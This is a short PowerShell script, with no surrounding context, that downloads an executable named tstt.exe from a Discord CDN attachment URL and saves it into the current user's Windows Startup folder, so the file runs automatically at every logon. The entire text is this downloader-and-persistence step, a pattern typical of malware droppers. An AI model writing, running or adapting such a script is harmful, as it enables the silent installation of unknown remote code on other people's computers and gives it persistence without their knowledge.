$exeUrl = "https://cdn.discordapp.com/attachments/1208762525546577981/1220924003196076154/tstt.exe?ex=6610b516&is=65fe4016&hm=3a88ce24d952a67d449d33c171b5b653ebbe5ffc3a0ae6265eea7530e967af5b&"
$downloadPath = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\tstt.exe"

Invoke-WebRequest -Uri $exeUrl -OutFile $downloadPath